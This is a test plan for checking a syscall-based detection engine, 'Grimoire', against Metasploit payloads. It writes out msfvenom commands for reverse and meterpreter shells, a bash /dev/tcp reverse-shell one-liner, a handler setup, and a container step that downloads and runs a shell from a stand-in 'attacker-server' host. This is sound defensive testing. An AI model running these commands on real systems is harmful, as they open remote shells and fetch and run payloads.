# ⚔️ THE TRIAL BY FIRE: Metasploit vs Grimoire

**Date**: 2025-10-22
**Status**: PREPARATION
**Objective**: Test the Grimoire against real-world attack frameworks

---

## THE DOCTRINE OF THE TRIAL

**"A weapon's true nature is only revealed in the chaos of a real war."**

We have tested the Grimoire in controlled environments. We have verified its architecture. We have proven its sovereignty.

Now it faces **real adversaries** - the battle-tested payloads of Metasploit Framework.

---

## METASPLOIT RECONNAISSANCE

**Framework**: Metasploit 6.4.92-dev ✅
**Attack Vectors Available**:
- Reverse TCP shells (staged and non-staged)
- Meterpreter (advanced post-exploitation)
- Privilege escalation modules
- Lateral movement tools
- Persistence mechanisms

---

## THE BATTLE PLAN

### Phase 1: BASELINE ATTACKS (Simple Reverse Shells)

**Objective**: Verify Grimoire detects standard reverse shell patterns

**Test Scenarios**:

#### 1.1: Linux x64 Reverse TCP Shell (Non-Staged)
```bash
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=127.0.0.1 LPORT=4444 \
    -f elf -o /tmp/reverse_shell.elf
```

**Expected Pattern**: `reverse_shell_classic`
- socket()
- connect() or dup2() sequence
- execve(/bin/sh)

**Guardian Config**: Enforcement mode ENABLED

**Success Criteria**:
- ✅ Grimoire detects the pattern
- ✅ Process is terminated before shell spawns
- ✅ JSON log records the kill
- ✅ No connection established to handler

---

#### 1.2: Linux x64 Reverse TCP Shell (Staged)
```bash
msfvenom -p linux/x64/shell/reverse_tcp \
    LHOST=127.0.0.1 LPORT=4444 \
    -f elf -o /tmp/staged_shell.elf
```

**Expected Behavior**: Staged payload may use different syscall patterns
- Initial stager connects and downloads second stage
- Second stage executes shell

**Success Criteria**:
- Grimoire detects at least one stage
- Process terminated OR connection blocked

---

#### 1.3: Meterpreter Reverse TCP
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=127.0.0.1 LPORT=4444 \
    -f elf -o /tmp/meterpreter.elf
```

**Expected Behavior**: Meterpreter is more sophisticated
- May use different I/O mechanisms
- More complex syscall patterns
- Potential obfuscation

**Success Criteria**:
- Observe what Grimoire sees
- Document syscall patterns used
- Identify detection gaps

---

### Phase 2: CONTAINERIZED ATTACKS

**Objective**: Verify container sovereignty under real attack

**Test Scenarios**:

#### 2.1: Reverse Shell from Container
```bash
docker run -it --rm ubuntu:latest bash -c "
    wget http://attacker-server/reverse_shell.elf
    chmod +x reverse_shell.elf
    ./reverse_shell.elf
"
```

**Expected**: Grimoire sees container PID, detects pattern, terminates

---

#### 2.2: Container Escape Attempt
```bash
# CVE-2019-5736 (runc escape) simulation
docker run -it --rm --privileged ubuntu:latest bash -c "
    # Attempt to overwrite host runc binary
"
```

**Expected**: May require new pattern (TBD)

---

### Phase 3: OBFUSCATION & EVASION

**Objective**: Test Grimoire against obfuscated payloads

**Test Scenarios**:

#### 3.1: Encoded Payload
```bash
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=127.0.0.1 LPORT=4444 \
    -f elf -e x64/xor -o /tmp/encoded_shell.elf
```

**Expected**: Syscall patterns should be the same (encoding doesn't change behavior)

---

#### 3.2: Custom Wrapper Script
```bash
# Python script that spawns Metasploit payload
python3 -c "import os; os.system('./reverse_shell.elf')"
```

**Expected**: Grimoire should see syscalls from the payload process

---

### Phase 4: ADVANCED TECHNIQUES

**Objective**: Test against sophisticated attack chains

#### 4.1: Multi-Stage Attack
1. Initial access (simple shell)
2. Privilege escalation (setuid exploit)
3. Persistence (cron job installation)
4. Data exfiltration

**Expected**: Multiple pattern matches across different attack phases

---

#### 4.2: Living Off The Land (LOTL)
```bash
# Use legitimate binaries for malicious purposes
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

**Expected**: Should match reverse_shell_classic (uses same syscalls)

---

## TEST ENVIRONMENT SETUP

### Guardian Configuration
```bash
sudo ./zig-out/bin/zig-sentinel \
    --enable-grimoire \
    --grimoire-debug \
    --grimoire-enforce \
    --duration=300
```

### Metasploit Handler Setup
```bash
msfconsole -q -x "
    use exploit/multi/handler
    set PAYLOAD linux/x64/shell_reverse_tcp
    set LHOST 127.0.0.1
    set LPORT 4444
    exploit -j
"
```

### Monitoring
- Guardian logs: `/tmp/trial-by-fire.log`
- JSON alerts: `/var/log/zig-sentinel/grimoire_alerts.json`
- Handler status: Watch for connections

---

## SUCCESS METRICS

### Detection Rate
- **Critical Attacks Detected**: % of known-malicious payloads detected
- **False Positive Rate**: % of benign activity flagged
- **Time to Detection**: How quickly after execution

### Enforcement Effectiveness
- **Termination Success Rate**: % of detected attacks successfully killed
- **Escape Attempts**: % of attacks that bypassed enforcement
- **Container Enforcement**: Specific metric for cross-namespace kills

### Pattern Coverage
- **Patterns Triggered**: Which HOT_PATTERNS fired
- **Gaps Identified**: Attack techniques that weren't detected
- **New Patterns Needed**: Document missing coverage

---

## EXPECTED OUTCOMES

### Best Case Scenario
- ✅ All Metasploit payloads detected and terminated
- ✅ No successful shells established
- ✅ Clean JSON logs with full attribution
- ✅ Container attacks stopped

### Realistic Scenario
- ✅ Most payloads detected
- ⚠️ Some sophisticated payloads slip through (identify gaps)
- ✅ Enforcement works when detection triggers
- 📊 Learn what patterns are missing

### Worst Case Scenario
- ❌ Metasploit payloads evade detection
- ❌ Grimoire sees syscalls but doesn't match patterns
- 📊 Major gaps identified
- 🔧 Requires significant pattern refinement

---

## KNOWLEDGE EXTRACTION PROTOCOL

For **each test**:
1. **Pre-Test**: State expected pattern match
2. **Execute**: Run attack while Guardian monitors
3. **Observe**: Check debug logs for syscall traces
4. **Analyze**: Did pattern match? Why or why not?
5. **Document**: Record findings in test report
6. **Adapt**: If detection failed, understand why

For **each failure**:
- Capture full syscall sequence from debug logs
- Identify which step in pattern failed to match
- Determine if pattern needs adjustment OR new pattern needed
- Create test case for regression testing

---

## SAFETY PROTOCOLS

**Containment**:
- All tests run on localhost (127.0.0.1)
- No external network access required
- Clean up all payloads after testing

**Evidence Preservation**:
- Save all logs to `/tmp/trial-by-fire/`
- Keep payload samples for analysis
- Document exact command lines used

**System Protection**:
- Guardian running in enforcement mode (will kill attacks)
- Payloads cannot persist (no write access to critical dirs)
- Easy rollback (VM snapshot if needed)

---

## THE FIRST STRIKE

**We begin with the simplest weapon**: A non-staged Linux x64 reverse TCP shell.

If the Grimoire falls to this basic attack, we learn immediately. If it stands, we escalate to more sophisticated adversaries.

**The Trial begins.**

---

*"We do not fear what we might find. The lessons from failure are worth more than the comfort of untested assumptions. Let the Grimoire prove itself in fire."*

**Status**: READY ⚔️
**Adversary**: Metasploit Framework 6.4.92-dev 🔴
**Defender**: Grimoire Behavioral Detection Engine ⚡
**Stakes**: The validation of our entire architectural doctrine ⚖️
